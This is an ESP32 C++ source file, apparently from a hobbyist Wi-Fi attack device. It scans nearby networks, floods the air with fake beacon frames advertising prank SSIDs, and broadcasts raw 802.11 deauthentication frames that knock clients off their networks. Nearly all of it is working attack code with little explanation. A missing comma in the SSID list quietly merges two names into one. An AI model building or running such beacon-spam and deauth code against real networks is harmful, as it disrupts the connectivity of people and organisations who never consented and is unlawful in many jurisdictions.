#include "wifi.h"
#include <WiFi.h>
#include "esp_wifi.h"

// Meerdere SSID-namen om te spammen
static const char* ssids[] = {
  "Free WiFi",
  "NSA Surveillance Van",
  "Starbucks Guest",
  "School WiFi",
  "Airport_WiFi",
  "iPhone 14 Hotspot",
  "Android_5G",
  "Public Network",
  "Hotel Room 203",
  "TestAP"
  "You Got Hacked"
};

void initWiFi() {
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true);
  delay(100);
}

void wifiScan() {
  Serial.println("[WiFi] Scanning...");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No networks found");
  } else {
    for (int i = 0; i < n; ++i) {
      Serial.printf("%d: %s (%d dBm) %s\n", i + 1,
        WiFi.SSID(i).c_str(), WiFi.RSSI(i),
        WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "Open" : "Secured");
    }
  }
}

void wifiBeaconSpam() {
  Serial.println("[WiFi] Sending fake beacons...");
  esp_wifi_set_promiscuous(true);
  for (int i = 0; i < 100; i++) {
    const char* ssid = ssids[i % (sizeof(ssids)/sizeof(ssids[0]))];
    uint8_t packet[128] = {
      0x80, 0x00, 0x00, 0x00,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
      0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
      0x00, 0x00,
      0x00, (uint8_t)strlen(ssid)
    };
    memcpy(&packet[26], ssid, strlen(ssid));
    packet[26 + strlen(ssid)] = 0x01;
    packet[27 + strlen(ssid)] = 0x08;
    memcpy(&packet[28 + strlen(ssid)], (uint8_t[]){0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c}, 8);

    esp_wifi_80211_tx(WIFI_IF_STA, packet, 36 + strlen(ssid), false);
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  Serial.println("[WiFi] Beacon spam complete.");
}

void wifiDeauth() {
  Serial.println("[WiFi] Sending DEAUTH frames...");
  uint8_t deauthFrame[26] = {
    0xc0, 0x00, // Type: deauth
    0x3a, 0x01, // Duration
    // Destination MAC (victim)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    // Source MAC (AP)
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
    // BSSID
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
    0x00, 0x00, // Seq number
    0x07, 0x00  // Reason code: Class 3 frame received from nonassociated STA
  };

  esp_wifi_set_promiscuous(true);
  for (int i = 0; i < 50; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  Serial.println("[WiFi] Deauth frames sent.");
}


